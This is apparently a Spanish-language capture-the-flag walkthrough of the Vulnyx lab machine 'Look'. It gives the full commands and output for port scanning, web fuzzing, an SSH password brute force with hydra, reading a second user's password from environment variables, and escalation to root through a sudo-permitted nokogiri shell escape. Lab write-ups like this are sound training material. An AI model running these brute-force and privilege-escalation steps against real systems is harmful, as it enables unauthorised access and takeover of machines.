# Vulnyx-Look

## Reconocimiento

```bash
# ARP scan
arp-scan -I eth0 --localnet
•192.168.200.18  08:00:27:ad:69:c8       PCS Systemtechnik GmbH

# Nmap scan
nmap -p- --min-rate 2000 -sS -sC -sV  -n -Pn 192.168.200.18 -oN nmap
•22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
•80/tcp open  http    Apache httpd 2.4.56 ((Debian))
```

## Fuzzing

```bash
# WFuzz
wfuzz --hc=404 -u http://192.168.200.18/FUZZ.php -w /usr/share/dirb/wordlists/big.txt
•/look.php
•/info.php
```

Dentro de "/info.php" encontramos la versión de PHP (7.4.33) y en la tabla "apache2handler" el usuario:
•user/grup	axel(1000)/1000 

Dentro de "/look.php" encontramos un texto con un horario "23:15:51 up 32 min,  0 users,  load average: 0.14, 0.20, 0.10"

## Obtención de Credenciales

```bash
# Fuerza bruta al servidor SSH
hydra -l axel -P /usr/share/wordlists/rockyou.txt -t 5 ssh://192.168.200.18
•22][ssh] host: 192.168.200.18   login: axel   password: bambam

# Acceso al servidor SSH
ssh axel@192.168.200.18
pass: bambam
```

## Escalada de Privilegios

```bash
# Leer /etc/passwd y encontrar usuario "dylan", con el binario "env" encontramos la pass para el usuario "dylan"
su dylan
pass: dylanPASS=bl4bl4Dyl4N

# Verificar privilegios sudo
sudo -l
• (root) NOPASSWD: /usr/bin/nokogiri

# Ejecutar nokogiri como root e inyectandole un formato .html nos da una consola para ejecutar comandos.
sudo /usr/bin/nokogiri index.html

# Escalar a root con GTFObins
>exec "/bin/sh"
>whoami
•root
```

¡Ya somos root! :D
